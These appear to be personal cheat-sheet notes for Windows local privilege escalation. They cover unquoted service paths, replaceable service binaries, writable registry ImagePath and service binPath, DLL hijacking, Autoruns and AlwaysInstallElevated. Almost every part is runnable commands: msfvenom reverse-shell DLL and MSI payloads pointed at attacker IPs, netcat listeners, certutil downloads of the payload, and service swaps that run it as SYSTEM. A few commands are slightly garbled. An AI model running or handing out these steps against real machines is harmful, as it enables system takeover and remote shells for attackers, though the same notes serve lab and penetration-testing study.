Trusted site: mitre, tenable

COMMANDS:
-----------------------------------------------------------------------------------------------
**Unquoted Service Path**

wmic service get name,pathname,startmode|findstr /i  /v C:\Windows\\

wmic service get name,pathname,startmode  |findstr /i  /v  C:\Windows\\| findstr  /i /v """

sc qc unquotedsvc

C:\Users\user\Desktop\Tools\accesschk64.exe -ucqv user /user unquotedsvc

icacls "C:\Program Files\Unquoted Path Service\Common Files"

icacls "C:\Program Files\Unquoted Path Service"

copy payload.exe "C:\Program Files\Unquoted Path Service\common.exe"

nc -nlvp 4443

net start unquotedsvc

go back to listening terminal
-----------------------------------------------------------------------------------------------
**Weak Executable File**

C:\Users\user\Desktop\Tools\PsInfo.exe /accepteula -s

wmic service get name | findstr /i /v "C:\Windows\\""

C:\Users\user\Desktop\Tools\accesschk64.exe -wvu "C:\Program Files\Microvirt\MEmu\MemuService.exe"

C:\Users\user\Desktop\Tools\accesschk64.exe /accepteula -ucqv user MEmuSVC

net stop MEmuSVC

copy /y usp_payload.exe "C:\Program Files\Microvirt\MEmu\MemuService.exe"

nc -nlvp 4443

net start net stop MEmuSVC

go back to listening terminal
-----------------------------------------------------------------------------------------------
**Insecure Registry Permission**

Enumeration:Open a command prompt and run the WMICcommand below to list the services in the local machine:
wmic service get name | findstr /i /v "C:\Windows\\""

Let us look for interesting service like “registry” or “regsvc”. Ex. RemoteRegistry

To check what groups this user belongs. all the output is the group of this user
whoami /groups
This useris a member of BUILTIN\Usersand NT AUTHORITY\INTERACTIVEgroups.

Run the command below to check for our permission in the services keys.
C:\Users\user\Desktop\Tools\accesschk64.exe "INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services
It seems that we have full access to the regsvcservice. 
RW HKLM\System\CurrentControlSet\services\regsvc
        KEY_ALL_ACCESS

Run SubInACL

C:\Users\user\Desktop\Tools\subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" /display

Run Powershell

Confirm if INTERACTIVE really has full-access:
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

Check if we can restart the service:
C:\Users\user\Desktop\Tools\accesschk64.exe /accepteula -ucqv user regsvc

Query the service's registry path to our payload:
reg query hklm\System\CurrentControlSet\services\regsvc

Modify the image path:
reg add "HKLM\SYSTEM\CurrentControlSet\Services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\Downloads\usp_payload.exe" /f

sc qc regsvc

sc query regsvc

nc -nlvp 4443

sc start regsvc

go back to listening terminal
-----------------------------------------------------------------------------------------------

DLL Hijacking

wmic service get name,pathname,startmode |findstr /i  /v C:\Windows\\

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.1.20 lport=4444 -f dll -o hijackme.dll

sudo python3 -m http.service 8000 - let the target download hijackme.dll and put it on /Temp

sc stop dllsvc and sc start dllsvc

go back to listening terminal
-----------------------------------------------------------------------------------------------

Weak Service Permission (binPath)

C:\Users\user\Desktop\Tools\accesschk64.exe -uwcv user *
 - RW WindscribeService SERVICE_ALL_ACCESS

sc qc WindscribeServicequit
 - BINARY_PATH_NAME   : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

Change the path to our payload:
sc config WindscribeService binpath= "C:\Users\user\Downloads\usp_payload.exe"

Verify the change:
sc qc WindscribeService

Setup listener: usp_payload uses port 4443 per our first config payload
nc -nlvp 4443

Restart service:
sc stop WindscribeService
sc query WindscribeService
sc start WindscribeService

go back to listening terminal
-----------------------------------------------------------------------------------------------
Autoruns

C:\Users\user\Desktop\Tools
 -Select the “Logon”tab and notice that the Image Path of “My Program” is pointing to “C:\Program Files\Autorun Program\program.exe"

Check the permissions of program.exe using PowerShell:
 - Get-ChildItem "C:\Program Files\Autorun Program\" -Recurse | Get-Acl | select Path,Owner,AccessToString,Group | Format-List
   - AccessToString : Everyone Allow  FullControl

Verify permission:
C:\Users\user\Desktop\Tools\accesschk64.exe -wvu "C:\Program Files\Autorun Program\program.exe"
 - RW Everyone | FILE_ALL_ACCESS

nc -nlvp 4443

Copy the payload to "C:\Program Files\Autorun Program\program.exe"
 - copy usp_payload.exe "C:\Program Files\Autorun Program\program.exe"

Log off as a “user”account and log back inas “admin”account to simulate an admin accessing his account and wait for a connection with admin privilegein our listener.

In adminaccount, you will be prompted with a security warning, select “Run”.

go back to listening terminal

-------------------------------------------------------------------------------------------------------------------------------------------
AlwaysInstallElevated

REG QUERY HKCU\Software\Policies\Microsoft\Windows\Installer
REG QUERY HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.121.131 lport=4443 -f msi -o aie_payload.msi

sudo python3 -m http.server 80 (urlcache is using port 80)

Let the target download the payload:
 - certutil -urlcache -f http://192.168.121.131/aie_payload.msi aie_payload.msi

Run the command below to execute the msi file:
 - msiexec  /quiet /qn  /i aie_payload.msi

go back to listening terminal


